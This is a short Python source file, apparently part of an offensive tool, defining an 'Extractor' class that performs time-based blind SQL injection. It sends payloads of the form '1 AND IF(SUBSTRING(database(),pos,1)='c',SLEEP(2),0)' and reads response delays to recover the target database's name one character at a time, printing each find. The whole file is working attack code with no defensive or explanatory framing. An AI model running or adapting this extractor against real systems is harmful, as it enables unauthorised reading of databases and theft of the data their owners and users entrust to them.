class Extractor:
    def __init__(self, inference, config):
        self.inf = inference
        self.charset = config["extraction"]["charset"]
        self.max_len = config["extraction"]["max_length"]

    def extract_string(self):
        result = ""

        for pos in range(1, self.max_len+1):
            char = self.extract_char(pos)
            if not char:
                break
            result += char
            print(f"[+] Found: {result}")

        return result

    def extract_char(self, position):
        for c in self.charset:
            payload = f"1 AND IF(SUBSTRING(database(),{position},1)='{c}',SLEEP(2),0)"
            if self.inf.is_true(payload):
                return c
        return None
